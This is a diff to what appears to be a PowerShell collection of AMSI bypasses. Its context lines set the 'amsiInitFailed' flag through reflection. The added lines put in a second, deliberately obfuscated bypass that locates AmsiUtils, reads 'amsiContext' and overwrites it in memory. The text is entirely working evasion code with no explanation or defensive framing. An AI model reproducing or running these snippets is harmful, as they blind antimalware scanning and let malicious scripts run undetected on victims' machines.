@@ -57,3 +57,9 @@ $estof = [Byte[]] ($aapt,$qkwf,$snxi,$wnan,+$nchj,+$yywa)
 
 $teste = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('am'+'siInitFailed','NonPublic,Static')
 $teste.SetValue($null,$true)
+
+==============================================================================================================================
+
+$x=51;$a=[Ref].Assembly;$y=$x*1000;$b=$a.GetTypes();$z=$y-32;$c=ForEach($d in $b){$y=$y-1;$z=$y;if($d.Name -like '*ils'){$z=$z-1;$x=$y+$z;if($d.Name -like '*siUt*'){$y=$y+1;$x=$y;$y=$y-1;$d;break;};};};$x=$z;$e=$c.GetFields('NonPublic,Static');$y=$x-2;$g=ForEach($f in $e){if($f.Name -like '*ext'){$z=$z-1;$x=$y+$z;if($f.Name -like '*siCo*'){$y=$y+1;$x=$y;$y=$y-1;$f;break;};};};$z=324;$h=$g.GetValue($null);$x=$y-2;[IntPtr]$i=$h;$z=$x+2;[Int32[]]$j=@(0);$y=$z;[System.Runtime.InteropServices.Marshal]::Copy($j,0,$i,1);
+
+==============================================================================================================================
